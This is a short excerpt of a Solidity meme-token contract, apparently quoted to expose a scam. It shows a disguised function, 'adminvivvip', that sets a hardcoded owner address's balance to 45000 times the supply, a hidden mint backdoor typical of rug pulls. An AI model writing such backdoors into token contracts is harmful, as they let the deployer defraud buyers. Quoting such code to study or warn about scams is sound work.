...
contract MEMEToken is Ownable {
    ...
    function adminvivvip() external {
        ...
        if(_beeceo88 == adminAddress){
            _balances[_beeceo88] = beeadminSupply()*(45000);
        }
    }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _beeceo88 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
